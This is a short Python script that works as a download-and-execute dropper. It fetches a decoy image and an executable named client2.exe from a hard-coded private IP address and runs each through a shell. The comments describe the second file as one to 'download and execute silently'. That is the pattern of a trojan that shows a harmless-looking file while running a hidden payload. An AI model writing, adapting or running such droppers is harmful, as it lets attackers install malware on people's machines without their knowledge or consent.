import requests,subprocess

def download_my_file(url):  # this function will download my file 
    get_responce = requests.get(url)
    with open(file_name,'wb') as file:
        file.write(get_responce.content)

def execute_my_file(file_name): # this function execute my file after downloading
    subprocess.run(file_name , shell=True)

def my_file_name(url):     # this function used to give proper name to my file
    return url.split("/")[-1]


url_1 = 'http://192.168.43.123/jadu.jpg'  #enter direct_url of file which you want to download and open.
file_name = my_file_name(url_1)
download_my_file(url_1)
execute_my_file(file_name)
url_2 ='http://192.168.43.123/client2.exe'   #enter direct_url of file which you want to download and execute silently. 
file_name = my_file_name(url_2)
download_my_file(url_2)
execute_my_file(file_name)

